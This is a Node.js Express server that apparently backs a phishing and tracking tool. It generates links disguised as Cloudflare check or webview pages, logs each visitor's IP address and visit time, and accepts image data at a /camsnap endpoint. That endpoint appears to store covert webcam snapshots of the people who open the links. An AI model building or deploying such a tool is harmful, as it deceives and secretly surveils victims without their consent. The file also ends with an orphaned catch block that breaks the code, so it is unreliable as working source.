require('dotenv').config();
const fs = require("fs");
const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const mongoose = require('mongoose');
const Url = require('./models/Url'); // Import the Url model

mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cors());
app.set("view engine", "ejs");

const hostURL = process.env.HOST_URL || "YOUR_HOST_URL";


app.post('/generate', async (req, res) => {
  try {
    const { originalUrl, redirectUrl } = req.body;
    const uniqueId = Math.random().toString(36).substring(7);
    const url = new Url({ originalUrl, uniqueId, redirectUrl });
    await url.save();
    console.log('URL saved:', url);

    const host = req.get('host');
    const cloudflareUrl = `https://${host}/c/${uniqueId}`;
    const webViewUrl = `https://${host}/w/${uniqueId}`;

    res.json({ cloudflareUrl, webViewUrl });
  } catch (error) {
    console.error('Error generating URL:', error);
    res.status(500).send('Server error');
  }
});

app.get('/c/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const url = await Url.findOne({ uniqueId: id });
    if (url) {
      res.render('cloudflare', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host') });
    } else {
      res.status(404).send('Not Found');
    }
  } catch (error) {
    console.error('Error fetching URL:', error);
    res.status(500).send('Server error');
  }
});

app.get('/w/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const url = await Url.findOne({ uniqueId: id });
    if (url) {
      res.render('webview', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host'), url: url.redirectUrl });
    } else {
      res.status(404).send('Not Found');
    }
  } catch (error) {
    console.error('Error fetching URL:', error);
    res.status(500).send('Server error');
  }
});

app.post("/camsnap", async (req, res) => {
  try {
    const { uid, img } = req.body;
    const url = await Url.findOne({ uniqueId: uid });
    if (url) {
      url.imageData = img;
      await url.save();
      res.send("Done");
    } else {
      res.status(404).send("Not Found");
    }
  } catch (error) {
    console.error("Error saving image:", error);
    res.status(500).send("Server error");
  }
});

  } catch (error) {
    console.error('Error uploading image:', error);
    res.status(500).send('Server error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
